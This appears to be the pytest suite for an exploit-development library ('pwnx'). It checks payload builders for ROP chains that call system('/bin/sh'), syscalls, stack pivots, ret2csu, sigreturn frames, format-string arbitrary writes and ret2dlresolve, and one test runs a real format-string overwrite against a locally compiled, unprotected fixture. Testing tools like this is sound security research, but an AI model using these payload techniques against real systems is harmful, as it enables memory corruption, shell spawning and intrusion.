from __future__ import annotations

import platform
from pathlib import Path
import re
import struct
import subprocess

import pytest

from pwnx.artifacts import Image
from pwnx.abi import LINUX_AMD64
from pwnx.errors import ConstraintError, PlanningError, UnsupportedFeature
from pwnx.expressions import BindingContext, Call, Expr
from pwnx.techniques import (
    ROPCompiler,
    SigreturnFrame,
    build_dlresolve,
    fmtstr_payload,
)


class FakeImage:
    pointer_size = 8
    relocatable = False

    def __init__(self):
        self.name = "fake"
        self._bytes = {
            b"\x5f\xc3": [0x401010],
            b"\x5e\xc3": [0x401020],
            b"\x5a\xc3": [0x401030],
            b"\x59\xc3": [0x401040],
            b"\x58\xc3": [0x401050],
            b"\x41\x58\xc3": [0x401060],
            b"\x41\x59\xc3": [0x401070],
            b"\x41\x5a\xc3": [0x401080],
            b"\xc3": [0x401001],
            b"\x0f\x05\xc3": [0x401090],
            b"/bin/sh\x00": [0x402000],
        }
        self.symbols = {"read": 0x400500}
        self.dynamic = {
            5: 0x400300,
            6: 0x400400,
            23: 0x400600,
            11: 24,
            9: 24,
        }
        self.segments = [
            {"vaddr": 0x400000, "memsz": 0x4000},
            {"vaddr": 0x601000, "memsz": 0x3000},
        ]

    def search(self, needle, executable=False):
        return self._bytes.get(needle, [])

    def address(self, value, label=None):
        return Expr.literal(value, kind="address", space="fake", label=label)

    def symbol(self, name):
        if name not in self.symbols:
            raise KeyError(name)
        return self.address(self.symbols[name], name)

    def call(self, name, *args):
        return Call(self.symbol(name), tuple(args), name)

    def section(self, name):
        if name == ".bss":
            return {"addr": 0x601800, "size": 0x100}
        if name == ".plt":
            return {"addr": 0x400480, "size": 0x100}
        raise KeyError(name)


class RelocatableFakeImage(FakeImage):
    relocatable = True

    def address(self, value, label=None):
        return Expr.fact(
            "libc.base",
            kind="address",
            space="libc",
            label=label,
        ) + (value - 0x400000)


def words(raw):
    return list(struct.unpack("<" + "Q" * (len(raw) // 8), raw))


def test_rop_call_resolves_string_and_aligns_stack():
    image = FakeImage()
    call = Call(
        Expr.literal(0x400900, kind="address", label="system"),
        (b"/bin/sh",),
        "system",
    )
    payload = ROPCompiler(image).call(call, resume=0x400700, entry_sp_mod16=0)

    assert words(payload.build(BindingContext())) == [
        0x401001,
        0x401010,
        0x402000,
        0x400900,
        0x400700,
    ]
    assert payload.layout()[0]["label"] == "ABI alignment ret"


def test_rop_call_reports_missing_string_and_bad_alignment():
    image = FakeImage()
    with pytest.raises(PlanningError, match="string storage"):
        ROPCompiler(image).call(Call(Expr.literal(1), (b"missing",)))
    with pytest.raises(PlanningError, match="modulo 8"):
        ROPCompiler(image).call(Call(Expr.literal(1), ()), entry_sp_mod16=4)


def test_rop_prefers_fixed_image_gadgets_over_relocated_images():
    dynamic = RelocatableFakeImage()
    fixed = FakeImage()
    call = Call(Expr.literal(0x400900, kind="address"), (1,))
    payload = ROPCompiler((dynamic, fixed)).call(call, entry_sp_mod16=8)

    assert "libc.base" not in payload.dependencies
    assert words(payload.build(BindingContext()))[:2] == [0x401010, 1]


def test_syscall_sets_linux_amd64_registers():
    raw = ROPCompiler(FakeImage()).syscall(
        1, (1, 0x404000, 8), resume=0x400700
    ).build(BindingContext())
    assert words(raw) == [
        0x401050,
        1,
        0x401010,
        1,
        0x401020,
        0x404000,
        0x401030,
        8,
        0x401090,
        0x400700,
    ]


def test_register_goals_use_multi_pop_gadgets_and_label_padding():
    image = FakeImage()
    image._bytes.pop(b"\x5a\xc3")
    image._bytes[b"\x5a\x5b\xc3"] = [0x4010A0]
    image._bytes[b"\x5b\xc3"] = [0x4010B0]

    payload = ROPCompiler(image).registers({"rdx": 3, "rbx": 4})
    values = words(payload.build(BindingContext()))
    assert values[:3] == [0x4010A0, 3, 0xDEAD000000000010]
    assert values[3:] == [0x4010B0, 4]
    assert "padding for popped rbx" in {
        row["label"] for row in payload.layout()
    }


def test_stack_migration_prefers_pop_rsp_and_supports_leave_fallback():
    direct = FakeImage()
    direct._bytes[b"\x5c\xc3"] = [0x4010C0]
    assert words(
        ROPCompiler(direct).migrate(0x700000).build(BindingContext())
    ) == [0x4010C0, 0x700000]

    fallback = FakeImage()
    fallback._bytes[b"\x5d\xc3"] = [0x4010D0]
    fallback._bytes[b"\xc9\xc3"] = [0x4010E0]
    assert words(
        ROPCompiler(fallback).pivot(0x700000).build(BindingContext())
    ) == [0x4010D0, 0x700000, 0x4010E0]


def test_ret2csu_compiles_indirect_call_and_argument_registers():
    image = FakeImage()
    image._bytes[
        b"\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3"
    ] = [0x401100]
    image._bytes[
        b"\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc"
        b"\x48\x83\xc3\x01\x48\x39\xeb\x75\xea\x48\x83\xc4\x08"
        b"\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3"
    ] = [0x401120]
    payload = ROPCompiler(image).ret2csu(
        0x404018,
        rdi=1,
        rsi=0x404800,
        rdx=8,
        continuation=0x401200,
    )
    values = words(payload.build(BindingContext()))
    assert values[:8] == [
        0x401100,
        0,
        1,
        0x404018,
        1,
        0x404800,
        8,
        0x401120,
    ]
    assert values[-1] == 0x401200
    with pytest.raises(ConstraintError, match="truncates rdi"):
        ROPCompiler(image).ret2csu(0x404018, rdi=1 << 40)

    symbolic = Expr.fact("argument")
    chain = ROPCompiler(image).ret2csu(0x404018, rdi=symbolic)
    context = BindingContext()
    context.bind(symbolic, 1 << 40)
    with pytest.raises(ConstraintError, match="must resolve within 32 bits"):
        chain.build(context)


def test_sigreturn_frame_matches_amd64_offsets():
    frame = SigreturnFrame(
        abi=LINUX_AMD64,
        rax=59,
        rdi=0x404000,
        rsp=0x405000,
        rip=0x401090,
    )
    raw = bytes(frame)
    assert frame.abi is LINUX_AMD64
    assert frame.size == LINUX_AMD64.schema("rt_sigreturn").size
    assert len(raw) == 248
    assert struct.unpack_from("<Q", raw, 104)[0] == 0x404000
    assert struct.unpack_from("<Q", raw, 144)[0] == 59
    assert struct.unpack_from("<Q", raw, 160)[0] == 0x405000
    assert struct.unpack_from("<Q", raw, 168)[0] == 0x401090
    assert struct.unpack_from("<Q", raw, 184)[0] == 0x33
    with pytest.raises(AttributeError):
        frame.no_such_register = 1
    with pytest.raises(UnsupportedFeature, match="rt_sigreturn"):
        SigreturnFrame(abi="linux-i386")


def _simulate_fmt(payload: bytes, offset: int, pointer_size: int = 8):
    specs = list(re.finditer(rb"%(\d+)\$(hhn|hn)", payload))
    first_arg = int(specs[0].group(1))
    pointer_start = (first_arg - offset) * pointer_size
    fmt = payload[:pointer_start]
    ptrs = [
        int.from_bytes(payload[index : index + pointer_size], "little")
        for index in range(pointer_start, len(payload), pointer_size)
    ]
    counter = 0
    memory = {}
    cursor = 0
    token = re.compile(rb"%(?:(\d+)c|(\d+)\$(hhn|hn))")
    for match in token.finditer(fmt):
        counter += match.start() - cursor
        cursor = match.end()
        if match.group(1):
            counter += int(match.group(1))
        else:
            arg = int(match.group(2))
            size = 1 if match.group(3) == b"hhn" else 2
            address = ptrs[arg - first_arg]
            memory[address] = (counter % (1 << (8 * size)), size)
    return memory


def test_fmtstr_payload_generates_short_and_byte_writes():
    payload = fmtstr_payload(
        6,
        {0x404040: b"\x34\x12\x56"},
        write_size="short",
    )
    memory = _simulate_fmt(payload, 6)
    assert memory[0x404040] == (0x1234, 2)
    assert memory[0x404042] == (0x56, 1)


def test_fmtstr_payload_checks_badbytes():
    with pytest.raises(ConstraintError, match="bad byte"):
        fmtstr_payload(6, {0x40400A: b"A"}, badbytes=b"\n")
    with pytest.raises(ValueError):
        fmtstr_payload(0, {1: 2})


@pytest.mark.skipif(
    platform.system() != "Linux" or platform.machine() != "x86_64",
    reason="real format-string fixture requires Linux AMD64",
)
def test_fmtstr_payload_performs_real_arbitrary_write(tmp_path: Path):
    source = Path(__file__).parent / "fixtures" / "format_string.c"
    binary = tmp_path / "format-string"
    subprocess.run(
        [
            "gcc",
            "-O0",
            "-fno-stack-protector",
            "-fcf-protection=none",
            "-no-pie",
            "-Wl,-z,relro,-z,lazy",
            str(source),
            "-o",
            str(binary),
        ],
        check=True,
        capture_output=True,
    )
    marker = 0x4242424241414141
    first_buffer_arg = None
    for position in range(1, 80):
        probe = f"AAAABBBB%{position}$p\n".encode()
        output = subprocess.check_output([str(binary)], input=probe, timeout=3)
        if f"0x{marker:x}".encode() in output:
            first_buffer_arg = position
            break
    assert first_buffer_arg is not None
    image = Image(binary)
    payload = fmtstr_payload(
        first_buffer_arg,
        {image.symbols["hook"]: image.symbols["win"]},
        write_size="short",
    )
    output = subprocess.check_output([str(binary)], input=payload, timeout=3)
    assert b"PWNX_FMT_OK\n" in output
    assert b"PWNX_FMT_SAFE\n" not in output


def test_dlresolve_builds_elf64_sym_rela_and_staging_chain():
    image = FakeImage()
    result = build_dlresolve(
        image,
        "system",
        ["/bin/sh"],
        data_addr=0x601900,
        resolution_addr=0x601980,
    )
    symtab = image.dynamic[6]
    jmprel = image.dynamic[23]
    symbol_name_addr = result.data_addr
    sym_addr = symtab + ((symbol_name_addr + 7 - symtab + 23) // 24) * 24
    rel_addr = jmprel + ((sym_addr + 24 - jmprel + 23) // 24) * 24
    sym_index = (sym_addr - symtab) // 24
    st_name, info, other, shndx, value, size = struct.unpack_from(
        "<IBBHQQ", result.data, sym_addr - result.data_addr
    )
    r_offset, r_info, addend = struct.unpack_from(
        "<QQq", result.data, rel_addr - result.data_addr
    )

    assert result.data.startswith(b"system\x00")
    assert st_name == result.data_addr - image.dynamic[5]
    assert (info, other, shndx, value, size) == (0x12, 0, 0, 0, 0)
    assert r_offset == 0x601980
    assert r_info == (sym_index << 32) | 7
    assert addend == 0
    assert result.reloc_index == (rel_addr - jmprel) // 24
    assert result.argument_values[0] >= rel_addr + 24
    assert result.first_stage.size > 0
